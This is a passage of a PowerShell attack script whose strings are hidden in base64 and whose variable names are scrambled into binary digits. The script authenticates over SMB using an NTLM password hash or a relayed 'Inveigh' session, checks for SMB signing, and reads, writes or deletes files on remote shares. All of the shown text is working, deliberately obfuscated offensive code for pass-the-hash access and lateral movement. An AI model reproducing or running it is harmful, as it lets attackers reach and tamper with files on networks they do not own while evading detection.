    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEwAZQBuAGcAdABoAA=='))),${01000110010010111})
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEkARAAyAA=='))),[Byte[]](0x30))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEwAZQBuAGcAdABoADIA'))),${01111000100101001})
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMASQBEAA=='))),[Byte[]](0xa0))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMATABlAG4AZwB0AGgA'))),[Byte[]](0x0e))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMASQBEADIA'))),[Byte[]](0x30))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMATABlAG4AZwB0AGgAMgA='))),[Byte[]](0x0c))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMASQBEADMA'))),[Byte[]](0x06))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMATABlAG4AZwB0AGgAMwA='))),[Byte[]](0x0a))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAA=='))),[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAG8AawBlAG4ASQBEAA=='))),[Byte[]](0xa2))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAG8AawBlAG4ATABlAG4AZwB0AGgA'))),${10010100010110111})
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABJAEQA'))),[Byte[]](0x04))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABMAGUAbgBnAHQAaAA='))),${10110111010100001})
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAZgBpAGUAcgA='))),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUARgBsAGEAZwBzAA=='))),${_10011011010110001})
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ARABvAG0AYQBpAG4A'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ATgBhAG0AZQA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    if($Version)
    {
        ${01000100101000011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),$Version)
    }
    return ${01000100101000011}
}
function _10010110011000110
{
    param([Byte[]]${_00000001001101111})
    [Byte[]]${10110111010100001} = ([System.BitConverter]::GetBytes(${_00000001001101111}.Length))[1,0]
    [Byte[]]${00100111101010111} = ([System.BitConverter]::GetBytes(${_00000001001101111}.Length + 12))[1,0]
    [Byte[]]${01000110010010111} = ([System.BitConverter]::GetBytes(${_00000001001101111}.Length + 8))[1,0]
    [Byte[]]${01111000100101001} = ([System.BitConverter]::GetBytes(${_00000001001101111}.Length + 4))[1,0]
    ${10111000110101111} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10111000110101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ASQBEAA=='))),[Byte[]](0xa1,0x82))
    ${10111000110101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ATABlAG4AZwB0AGgA'))),${00100111101010111})
    ${10111000110101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ASQBEADIA'))),[Byte[]](0x30,0x82))
    ${10111000110101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ATABlAG4AZwB0AGgAMgA='))),${01000110010010111})
    ${10111000110101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ASQBEADMA'))),[Byte[]](0xa2,0x82))
    ${10111000110101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ATABlAG4AZwB0AGgAMwA='))),${01111000100101001})
    ${10111000110101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABJAEQA'))),[Byte[]](0x04,0x82))
    ${10111000110101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABMAGUAbgBnAHQAaAA='))),${10110111010100001})
    ${10111000110101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBSAGUAcwBwAG8AbgBzAGUA'))),${_00000001001101111})
    return ${10111000110101111}
}
function _10101100111001000
{
    param ([Int]${_10001110100011010},[Byte[]]${_10100010101001111})
    ${00110000001100101} = [System.BitConverter]::ToUInt16(${_10100010101001111}[${_10001110100011010}..(${_10001110100011010} + 1)],0)
    return ${00110000001100101}
}
if($Modify -and $Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))) -and $Source -isnot [Byte[]])
{
    ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAG8AdQByAGMAZQAgAG0AdQBzAHQAIABiAGUAIABhACAAYgB5AHQAZQAgAGEAcgByAGEAeQAgAHcAaABlAG4AIAB1AHMAaQBuAGcAIAAtAE0AbwBkAGkAZgB5AA==')))
    ${00100001110110100} = $true
}
elseif((!$Modify -and $Source -isnot [String]) -or ($Modify -and $Action -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))) -and $Source -isnot [String]))
{
    ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAG8AdQByAGMAZQAgAG0AdQBzAHQAIABiAGUAIABhACAAcwB0AHIAaQBuAGcA')))
    ${00100001110110100} = $true
}
elseif($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA'))) -and !$Source.StartsWith("\\"))
{
    ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAG8AdQByAGMAZQAgAG0AdQBzAHQAIABiAGUAIABhACAAVQBOAEMAIABmAGkAbABlACAAcABhAHQAaAA=')))
    ${00100001110110100} = $true
}
elseif($Source -is [String])
{
    $source = $Source.Replace('.\','')
}
if($PSBoundParameters.ContainsKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA=')))))
{
    ${00010111101111000} = $true
}
if($PSBoundParameters.ContainsKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA=')))))
{
    if(!$Inveigh)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABJAG4AdgBlAGkAZwBoACAAUgBlAGwAYQB5ACAAcwBlAHMAcwBpAG8AbgAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
        ${00100001110110100} = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABJAG4AdgBlAGkAZwBoACAAUgBlAGwAYQB5ACAAcwBlAHMAcwBpAG8AbgAgAG4AbwB0ACAAYwBvAG4AbgBlAGMAdABlAGQA')))
        ${00100001110110100} = $true
    }
}
$destination = $Destination.Replace('.\','')
if($hash -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgA6ACoA'))))
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}
if($Domain)
{
    ${00100110100100110} = $Domain + "\" + $Username
}
else
{
    ${00100110100100110} = $Username
}
${00101101111101100} = [System.Diagnostics.Process]::GetCurrentProcess() | select -expand id
${00101101111101100} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${00101101111101100}))
[Byte[]]${00101101111101100} = ${00101101111101100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
if(!${00010111101111000})
{
    ${01000100110110000} = New-Object System.Net.Sockets.TCPClient
    ${01000100110110000}.Client.ReceiveTimeout = 30000
}
${01010110011000111} = 0
if($Action -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))))
{
    $source = $source.Replace('\\','')
    ${01100111010011011} = $source.Split('\')
    ${10011000110000100} = ${01100111010011011}[0]
    ${01011010010000111} = ${01100111010011011}[1]
    ${10011010100011110} = $source.ToCharArray()
    [Array]::Reverse(${10011010100011110})
    ${00010110100000001} = -join(${10011010100011110})
    ${00010110100000001} = ${00010110100000001}.SubString(0,${00010110100000001}.IndexOf('\'))
    ${10010011001101001} = ${00010110100000001}.ToCharArray()
    [Array]::Reverse(${10010011001101001})
    ${00010110100000001} = -join(${10010011001101001})
    ${00001101001011101} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewAxADAAMAAxADEAMAAwADAAMQAxADAAMAAwADAAMQAwADAAfQBcACQAewAwADEAMAAxADEAMAAxADAAMAAxADAAMAAwADAAMQAxADEAfQA=')))
}
switch($Action)
{
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA')))
    {
        if(!$Modify)
        {
            if($destination -and $destination -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcACoA'))))
            {
                ${00000011111111010} = $destination.ToCharArray()
                [Array]::Reverse(${00000011111111010})
                ${10010101100110111} = -join(${00000011111111010})
                ${10010101100110111} = ${10010101100110111}.SubString(0,${10010101100110111}.IndexOf('\'))
                ${00000011111111010} = ${10010101100110111}.ToCharArray()
                [Array]::Reverse(${00000011111111010})
                ${10010101100110111} = -join(${00000011111111010})
                ${10110000110010100} = $destination
            }
            elseif($destination)
            {
                if(Test-Path (Join-Path $PWD $destination))
                {
                    ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIABmAGkAbABlACAAYQBsAHIAZQBhAGQAeQAgAGUAeABpAHMAdABzAA==')))
                    ${00100001110110100} = $true
                }
                else
                {
                    ${10110000110010100} = Join-Path $PWD $destination
                }
            }
            else
            {
                if(Test-Path (Join-Path $PWD ${00010110100000001}))
                {
                    ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIABmAGkAbABlACAAYQBsAHIAZQBhAGQAeQAgAGUAeABpAHMAdABzAA==')))
                    ${00100001110110100} = $true
                }
                else
                {
                    ${10110000110010100} = Join-Path $PWD ${00010110100000001}
                }
            }
        }
        else
        {
            ${00011100000111100} = New-Object System.Collections.ArrayList
        }
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA')))
    {
        if(!$Modify)
        {
            if($source -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcACoA'))))
            {
                $source = Join-Path $PWD $source
            }
            if(Test-Path $source)
            {
                [Int64]${01011001110100010} = (gi $source).Length
                ${00010110100000001} = $source
                if(${01011001110100010} -gt 65536)
                {
                    ${10111001100101101} = [Math]::Truncate(${01011001110100010} / 65536)
                    ${00101011001100100} = ${01011001110100010} % 65536
                    ${01100000100010011} = 65536
                }
                else
                {
                    ${01100000100010011} = ${01011001110100010}
                }
                ${01010000110010101} = gp -path ${00010110100000001}
                ${01000010000111100} = ${01010000110010101}.CreationTime.ToFileTime()
                ${01000010000111100} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${01000010000111100}))
                ${01000010000111100} = ${01000010000111100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                ${01100111110011110} = ${01010000110010101}.LastAccessTime.ToFileTime()
                ${01100111110011110} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${01100111110011110}))
                ${01100111110011110} = ${01100111110011110}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                ${01000010011011100} = ${01010000110010101}.LastWriteTime.ToFileTime()
                ${01000010011011100} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${01000010011011100}))
                ${01000010011011100} = ${01000010011011100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                ${10001110010010000} = ${01000010011011100}
                ${10100100100111011} = new-object byte[] ${01100000100010011}
                ${01100101100100100} = new-object IO.FileStream(${00010110100000001},[System.IO.FileMode]::Open)
                ${00010011100011010} = new-object IO.BinaryReader(${01100101100100100})
            }
            else
            {
                ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABGAGkAbABlACAAbgBvAHQAIABmAG8AdQBuAGQA')))
                ${00100001110110100} = $true
            }
        }
        else
        {
            [Int64]${01011001110100010} = $Source.Count
            if(${01011001110100010} -gt 65536)
            {
                ${10111001100101101} = [Math]::Truncate(${01011001110100010} / 65536)
                ${00101011001100100} = ${01011001110100010} % 65536
                ${01100000100010011} = 65536
            }
            else
            {
                ${01100000100010011} = ${01011001110100010}
            }
        }
        $destination = $destination.Replace('\\','')
        ${10010100111000010} = $destination.Split('\')
        ${10011000110000100} = ${10010100111000010}[0]
        ${01011010010000111} = ${10010100111000010}[1]
        ${00000011111111010} = $destination.ToCharArray()
        [Array]::Reverse(${00000011111111010})
        ${10010101100110111} = -join(${00000011111111010})
        ${10010101100110111} = ${10010101100110111}.SubString(0,${10010101100110111}.IndexOf('\'))
        ${00000011111111010} = ${10010101100110111}.ToCharArray()
        [Array]::Reverse(${00000011111111010})
        ${10010101100110111} = -join(${00000011111111010})
    }
}
if($Action -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))))
{
    if(${01100111010011011}.Count -gt 2)
    {
        ${10000110000000001} = $source.Substring(${10011000110000100}.Length + ${01011010010000111}.Length + 2)
    }
}
else
{
    if(${10010100111000010}.Count -gt 2)
    {
        ${10000110000000001} = $destination.Substring(${10011000110000100}.Length + ${01011010010000111}.Length + 2)
    }
}
if(${10000110000000001} -and ${10000110000000001}.EndsWith('\'))
{
    ${10000110000000001} = ${10000110000000001}.Substring(0,${10000110000000001}.Length - 1)
}
if(!${00100001110110100} -and !${00010111101111000})
{
    try
    {
        ${01000100110110000}.Connect(${10011000110000100},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADUA'))))
    }
    catch
    {
        ${01100110111011000} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHsAMQAwADAAMQAxADAAMAAwADEAMQAwADAAMAAwADEAMAAwAH0AIABkAGkAZAAgAG4AbwB0ACAAcgBlAHMAcABvAG4AZAA=')))
    }
}
if(${01000100110110000}.Connected -or (!${00100001110110100} -and $inveigh.session_socket_table[$session].Connected))
{
    ${00011101010001010} = New-Object System.Byte[] 81920
    if(!${00010111101111000})
    {
        ${01001101101100010} = ${01000100110110000}.GetStream()
        if(${10100011001111100} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA'))))
        {
            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIAMgA=')))
        }
        else
        {
            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIA')))
        }
        while(${10000110001100100} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
        {
            try
            {
                switch (${10000110001100100})
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIA')))
                    {          
                        ${01001001111100000} = _10001001110101001 0x72 0x18 0x01,0x48 0xff,0xff ${00101101111101100} 0x00,0x00       
                        ${10100000100111101} = _10110000100111010 ${10100011001111100}
                        ${10111100101110101} = _00001101111001010 ${01001001111100000}
                        ${10011100001010100} = _00001101111001010 ${10100000100111101}
                        ${10001001100110010} = _01001110110110100 ${10111100101110101}.Length ${10011100001010100}.Length
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        ${10111000101110001} = ${00111100000001110} + ${10111100101110101} + ${10011100001010100}
                        try
                        {
                            ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                            ${01001101101100010}.Flush()    
                            ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                            if([System.BitConverter]::ToString(${00011101010001010}[4..7]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBmAC0ANQAzAC0ANABkAC0ANAAyAA=='))))
                            {
                                ${10100011001111100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA=')))
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABOAGUAZwBvAHQAaQBhAHQAZQA=')))
                                if([System.BitConverter]::ToString(${00011101010001010}[39]) -eq '0f')
                                {
                                    if(${10101001101101001})
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQAIABvAG4AIAAkAHsAMQAwADAAMQAxADAAMAAwADEAMQAwADAAMAAwADEAMAAwAH0A')))
                                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {    
                                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQA')))
                                        ${00011001101011011} = $true
                                        ${00111010011101010} = 0x00,0x00
                                        ${00001101110101000} = 0x15,0x82,0x08,0xa0
                                    }
                                }
                                else
                                {
                                    if(${10101001101101001})
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIABuAG8AdAAgAHIAZQBxAHUAaQByAGUAZAAgAG8AbgAgACQAewAxADAAMAAxADEAMAAwADAAMQAxADAAMAAwADAAMQAwADAAfQA=')))
                                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {    
                                        ${00011001101011011} = $false
                                        ${00111010011101010} = 0x00,0x00
                                        ${00001101110101000} = 0x05,0x82,0x08,0xa0
                                    }
                                }
                            }
                            else
                            {
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIAMgA=')))
                                if([System.BitConverter]::ToString(${00011101010001010}[70]) -eq '03')
                                {
                                    if(${10101001101101001})
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQAIABvAG4AIAAkAHsAMQAwADAAMQAxADAAMAAwADEAMQAwADAAMAAwADEAMAAwAH0A')))
                                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {   
                                        if(!${00011001101011011})
                                        {
                                            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQA')))
                                        }
                                        ${00011001101011011} = $true
                                        ${00111010011101010} = 0x00,0x00
                                        ${00001101110101000} = 0x15,0x82,0x08,0xa0
                                    }
                                }
                                else
                                {
                                    if(${10101001101101001})
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIABuAG8AdAAgAHIAZQBxAHUAaQByAGUAZAAgAG8AbgAgACQAewAxADAAMAAxADEAMAAwADAAMQAxADAAMAAwADAAMQAwADAAfQA=')))
                                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {    
                                        ${00011001101011011} = $false
                                        ${00111010011101010} = 0x00,0x00
                                        ${00001101110101000} = 0x05,0x80,0x08,0xa0
                                    }
                                }
                            }
                        }
                        catch
                        {
                            if($_.Exception.Message -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AIABjAGEAbABsAGkAbgBnACAAIgBSAGUAYQBkACIAIAB3AGkAdABoACAAIgAzACIAIABhAHIAZwB1AG0AZQBuAHQAKABzACkAOgAgACIAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAYQBkACAAZABhAHQAYQAgAGYAcgBvAG0AIAB0AGgAZQAgAHQAcgBhAG4AcwBwAG8AcgB0ACAAYwBvAG4AbgBlAGMAdABpAG8AbgA6ACAAQQBuACAAZQB4AGkAcwB0AGkAbgBnACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAHcAYQBzACAAZgBvAHIAYwBpAGIAbAB5ACAAYwBsAG8AcwBlAGQAIABiAHkAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAaABvAHMAdAAuACIA'))))
                            {
                                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAE0AQgAxACAAbgBlAGcAbwB0AGkAYQB0AGkAbwBuACAAZgBhAGkAbABlAGQA')))
                                ${10111110011001101} = $true
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIAMgA=')))
                    {
                        if(${10100011001111100} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA'))))
                        {
                            ${01101111101011000} = 0
                        }
                        else
                        {
                            ${01101111101011000} = 1
                        }
                        ${10000111101100010} = 0x00,0x00,0x00,0x00
                        ${01101000011110110} = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        ${01001001111100000} = _01000000100101100 0x00,0x00 0x00,0x00 $false ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${10100000100111101} = _10101000001010011
                        ${10111100101110101} = _00001101111001010 ${01001001111100000}
                        ${10011100001010100} = _00001101111001010 ${10100000100111101}
                        ${10001001100110010} = _01001110110110100 ${10111100101110101}.Length ${10011100001010100}.Length
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        ${10111000101110001} = ${00111100000001110} + ${10111100101110101} + ${10011100001010100}
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()    
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABOAGUAZwBvAHQAaQBhAHQAZQA=')))
                        if([System.BitConverter]::ToString(${00011101010001010}[70]) -eq '03')
                        {
                            if(${10101001101101001})
                            {
                                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQAIABvAG4AIAAkAHsAMQAwADAAMQAxADAAMAAwADEAMQAwADAAMAAwADEAMAAwAH0A')))
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            else
                            {
                                if(!${00011001101011011})
                                {
                                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQA')))
                                }
                                ${00011001101011011} = $true
                                ${00111010011101010} = 0x00,0x00
                                ${00001101110101000} = 0x15,0x82,0x08,0xa0
                            }
                        }
                        else
                        {
                            if(${10101001101101001})
                            {
                                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIABuAG8AdAAgAHIAZQBxAHUAaQByAGUAZAAgAG8AbgAgACQAewAxADAAMAAxADEAMAAwADAAMQAxADAAMAAwADAAMQAwADAAfQA=')))
                                ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            else
                            {
                                ${00011001101011011} = $false
                                ${00111010011101010} = 0x00,0x00
                                ${00001101110101000} = 0x05,0x80,0x08,0xa0
                            }
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABOAGUAZwBvAHQAaQBhAHQAZQA=')))
                    { 
                        if(${10100011001111100} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
                        {
                            ${01001001111100000} = _10001001110101001 0x73 0x18 0x07,0xc8 0xff,0xff ${00101101111101100} 0x00,0x00
                            if(${00011001101011011})
                            {
                                ${01001001111100000}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            }
                            ${00111011101110110} = _10101110010011100 ${00001101110101000}
                            ${10111100101110101} = _00001101111001010 ${01001001111100000}
                            ${00011111110010010} = _00001101111001010 ${00111011101110110}       
                            ${10100000100111101} = _01101101000011000 ${00011111110010010}
                            ${10011100001010100} = _00001101111001010 ${10100000100111101}
                            ${10001001100110010} = _01001110110110100 ${10111100101110101}.Length ${10011100001010100}.Length
                            ${00111100000001110} = _00001101111001010 ${10001001100110010}
                            ${10111000101110001} = ${00111100000001110} + ${10111100101110101} + ${10011100001010100}
                        }
                        else
                        {
                            ${01101111101011000}++
                            ${01001001111100000} = _01000000100101100 0x01,0x00 0x1f,0x00 $false ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                            ${00111011101110110} = _10101110010011100 ${00001101110101000} 0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f
                            ${10111100101110101} = _00001101111001010 ${01001001111100000}
                            ${00011111110010010} = _00001101111001010 ${00111011101110110}       
                            ${10100000100111101} = _01110111011011000 ${00011111110010010}
                            ${10011100001010100} = _00001101111001010 ${10100000100111101}
                            ${10001001100110010} = _01001110110110100 ${10111100101110101}.Length ${10011100001010100}.Length
                            ${00111100000001110} = _00001101111001010 ${10001001100110010}
                            ${10111000101110001} = ${00111100000001110} + ${10111100101110101} + ${10011100001010100}
                        }
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()    
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                    }
                }
            }
            catch
            {
                echo "[-] $($_.Exception.Message)"
                ${10111110011001101} = $true
            }
        }
        if(!${10101001101101001} -and !${10111110011001101})
        {
            ${00101110100100001} = [System.BitConverter]::ToString(${00011101010001010})
            ${00101110100100001} = ${00101110100100001} -replace "-",""
            ${01010011010010111} = ${00101110100100001}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
